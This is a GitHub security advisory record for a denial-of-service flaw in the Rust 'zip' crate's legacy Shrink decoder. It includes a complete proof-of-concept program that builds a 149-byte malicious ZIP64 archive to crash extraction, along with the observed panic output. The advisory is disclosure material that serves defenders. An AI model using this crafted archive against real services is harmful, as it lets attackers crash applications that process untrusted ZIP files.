@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-9hj8-73fh-9963",
+  "modified": "2026-10-29T17:00:04.177534981Z",
+  "published": "2026-10-29T16:40:19Z",
+  "aliases": [
+    "CVE-2026-115907"
+  ],
+  "summary": "zip: legacy Shrink/Reduce/Implode decoder: denial of service from attacker-controlled ZIP64 uncompressed size",
+  "details": "### Summary\n\nA malicious 149-byte ZIP archive can cause a denial of service in applications that enable `legacy-zip` and use `ZipArchive::extract()`. An attacker-controlled ZIP64 uncompressed size triggers a `capacity overflow` panic in the Shrink decoder in optimized builds, potentially terminating the affected process.\n\n### Details\n\nWhen reading a Shrink-compressed entry, `ShrinkDecoder::read()` buffers the compressed input and reserves output capacity using the entry's declared uncompressed size:\n\n```rust\nif !self.stream_read {\n    self.stream_read = true;\n    let mut compressed_bytes = Vec::new();\n    self.compressed_reader.read_to_end(\u0026mut compressed_bytes)?;\n    self.stream.reserve(self.uncompressed_size as usize);\n    hwunshrink(\n        \u0026compressed_bytes,\n        self.uncompressed_size as usize,\n        \u0026mut self.stream,\n    )?;\n}\n```\n\nIn version 8.6.0, this is located in [`src/legacy/shrink.rs`](https://github.com/zip-rs/zip2/blob/771dfc534d2614158af5497ea3dff4d4208d7db1/src/legacy/shrink.rs#L341-L352). The vulnerable legacy codecs are compiled when the `legacy-zip` Cargo feature is enabled.\n\n`self.uncompressed_size` is populated from ZIP metadata. For ZIP64 entries, an attacker can set it to a 64-bit value independently of the archive's actual compressed payload size. The PoC declares an uncompressed size of `u64::MAX`, while supplying only one byte of compressed data.\n\nThe reserve occurs before `hwunshrink()` can validate or decode the compressed stream. Consequently, the impossible capacity causes a deterministic `capacity overflow` panic instead of returning a normal archive or I/O error. The behavior also occurs in optimized release builds and is reachable through `ZipArchive::extract()`.\n\nThe same unbounded allocation pattern is present in the legacy Reduce and Implode decoder implementations. This PoC specifically demonstrates the Shrink path.\n\n### PoC\n\nCreate a new Cargo project with the following layout:\n\n```text\nzip2-legacy-poc/\n|-- Cargo.toml\n`-- src/\n    `-- main.rs\n```\n\nUse this `Cargo.toml`:\n\n```toml\n[package]\nname = \"zip2-legacy-poc\"\nversion = \"0.1.0\"\nedition = \"2024\"\npublish = false\n\n[dependencies]\ntempfile = \"3\"\nzip = { version = \"=8.6.0\", features = [\"legacy-zip\"] }\n```\n\nUse this `src/main.rs`:\n\n```rust\nuse std::fs::File;\nuse std::io::{Cursor, Write};\n\nfn push16(out: \u0026mut Vec\u003cu8\u003e, value: u16) {\n    out.extend_from_slice(\u0026value.to_le_bytes());\n}\n\nfn push32(out: \u0026mut Vec\u003cu8\u003e, value: u32) {\n    out.extend_from_slice(\u0026value.to_le_bytes());\n}\n\nfn push64(out: \u0026mut Vec\u003cu8\u003e, value: u64) {\n    out.extend_from_slice(\u0026value.to_le_bytes());\n}\n\nfn zip64_extra() -\u003e Vec\u003cu8\u003e {\n    let mut extra = Vec::new();\n    push16(\u0026mut extra, 0x0001);\n    push16(\u0026mut extra, 16);\n    push64(\u0026mut extra, u64::MAX);\n    push64(\u0026mut extra, 1);\n    extra\n}\n\nfn archive() -\u003e Vec\u003cu8\u003e {\n    let name = b\"entry\";\n    let extra = zip64_extra();\n    let mut out = Vec::new();\n\n    push32(\u0026mut out, 0x0403_4b50);\n    push16(\u0026mut out, 45);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 1); // Shrink compression.\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 0);\n    push32(\u0026mut out, 0);\n    push32(\u0026mut out, u32::MAX);\n    push32(\u0026mut out, u32::MAX);\n    push16(\u0026mut out, name.len() as u16);\n    push16(\u0026mut out, extra.len() as u16);\n    out.extend_from_slice(name);\n    out.extend_from_slice(\u0026extra);\n    out.push(0);\n\n    let central_start = out.len() as u32;\n\n    push32(\u0026mut out, 0x0201_4b50);\n    push16(\u0026mut out, 45);\n    push16(\u0026mut out, 45);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 1); // Shrink compression.\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 0);\n    push32(\u0026mut out, 0);\n    push32(\u0026mut out, u32::MAX);\n    push32(\u0026mut out, u32::MAX);\n    push16(\u0026mut out, name.len() as u16);\n    push16(\u0026mut out, extra.len() as u16);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 0);\n    push32(\u0026mut out, 0);\n    push32(\u0026mut out, 0);\n    out.extend_from_slice(name);\n    out.extend_from_slice(\u0026extra);\n\n    let central_size = out.len() as u32 - central_start;\n\n    push32(\u0026mut out, 0x0605_4b50);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 0);\n    push16(\u0026mut out, 1);\n    push16(\u0026mut out, 1);\n    push32(\u0026mut out, central_size);\n    push32(\u0026mut out, central_start);\n    push16(\u0026mut out, 0);\n    out\n}\n\nfn main() -\u003e Result\u003c(), Box\u003cdyn std::error::Error\u003e\u003e {\n    let bytes = archive();\n    File::create(\"poc.zip\")?.write_all(\u0026bytes)?;\n\n    let mut archive = zip::ZipArchive::new(Cursor::new(bytes))?;\n    let entry = archive.by_index(0)?;\n\n    println!(\n        \"method={:?} declared_size={}\",\n        entry.compression(),\n        entry.size()\n    );\n\n    drop(entry);\n\n    let output = tempfile::tempdir()?;\n    archive.extract(output.path())?;\n    Ok(())\n}\n```\n\nRun the reproducer in release mode:\n\n```sh\ncd zip2-legacy-poc\nRUST_BACKTRACE=1 cargo run --release\n```\n\nObserved output with `zip` 8.6.0 on `x86_64-unknown-linux-gnu`:\n\n```text\nmethod=Shrink declared_size=18446744073709551615\n\nthread 'main' panicked at .../alloc/src/raw_vec/mod.rs:\ncapacity overflow\n```\n\nThe backtrace reaches the Shrink decompressor through `std::io::copy` and `ZipArchive::extract_internal()`. The process exits with status 101. The program also writes the generated 149-byte archive to `poc.zip` before triggering extraction.\n\n### Impact\n\nApplications that enable `legacy-zip` and pass attacker-supplied ZIP files to the following extraction API can be forced to panic before the compressed entry is validated or decoded. An unhandled panic may terminate the archive-processing process and cause a denial of service.\n\n- `zip::read::ZipArchive::extract`",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "5.1.0"
+            },
+            {
+              "fixed": "9.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9hj8-73fh-9963/GHSA-9hj8-73fh-9963.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/security/advisories/GHSA-9hj8-73fh-9963"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115907"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/pull/991"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/commit/8b4991288b79ad11cce201c2d785d5baa795bd3e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/zip-rs/zip2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/releases/tag/v9.0.0"
+    }
+  ]
+}
